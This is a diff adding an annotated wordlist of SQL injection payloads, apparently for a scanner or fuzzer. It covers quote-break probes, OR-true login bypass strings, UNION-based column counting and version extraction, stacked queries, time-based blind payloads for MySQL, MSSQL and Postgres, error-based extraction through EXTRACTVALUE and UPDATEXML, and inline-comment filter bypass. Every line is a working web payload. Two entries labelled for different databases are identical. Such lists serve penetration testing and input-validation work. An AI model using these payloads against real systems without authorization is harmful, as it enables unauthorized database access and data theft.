@@ -1,0 +1,51 @@
+# SQLi probe payloads - one per line, # lines are comments.
+# Single quote break
+'
+# Double quote break
+"
+# Comment out rest of query (MySQL)
+' OR '1'='1' --
+# Comment out rest of query (MSSQL double dash)
+' OR '1'='1' --
+# OR true with hash comment
+' OR 1=1 #
+# OR true with double quote
+" OR "1"="1
+# Boolean true probe
+' AND '1'='1
+# Boolean false probe
+' AND '1'='2
+# Numeric OR true
+1 OR 1=1
+# Numeric OR true with comment
+1 OR 1=1 --
+# UNION probe, column count 1
+' UNION SELECT NULL --
+# UNION probe, column count 3
+' UNION SELECT NULL,NULL,NULL --
+# UNION with version
+' UNION SELECT NULL,@@version,NULL --
+# Stacked query
+'; SELECT 1 --
+# Time-based MySQL
+' AND SLEEP(5) --
+# Time-based MySQL benchmark
+' AND BENCHMARK(5000000,MD5(1)) --
+# Time-based MSSQL
+'; WAITFOR DELAY '0:0:5' --
+# Time-based Postgres
+'; SELECT pg_sleep(5) --
+# Error-based MySQL extractvalue
+' AND EXTRACTVALUE(1,CONCAT(0x5c,@@version)) --
+# Error-based MySQL updatexml
+' AND UPDATEXML(1,CONCAT(0x5c,@@version),1) --
+# ORDER BY probe
+' ORDER BY 1 --
+# GROUP BY probe
+' GROUP BY 1 --
+# LIKE wildcard probe
+%' OR '%'='%
+# Second-order / stored quote
+admin'--
+# Bypass with inline comment
+'/**/OR/**/1=1/**/--
